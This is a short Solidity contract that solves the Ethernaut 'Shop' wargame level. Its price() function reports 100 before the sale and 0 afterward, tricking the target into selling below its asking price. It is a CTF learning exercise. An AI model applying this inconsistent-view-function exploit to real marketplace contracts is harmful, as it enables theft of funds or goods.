// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../ethernaut/levels/Shop.sol';

contract ShopSolution is Buyer {
  Shop target;

  constructor(address targetAddress) {
      target = Shop(targetAddress);
  }

  function exploit() public {
      target.buy();
  }

  function price() external view override returns (uint) {
    if (target.isSold()) {
      return 0;
    }
    return 100;
  }
}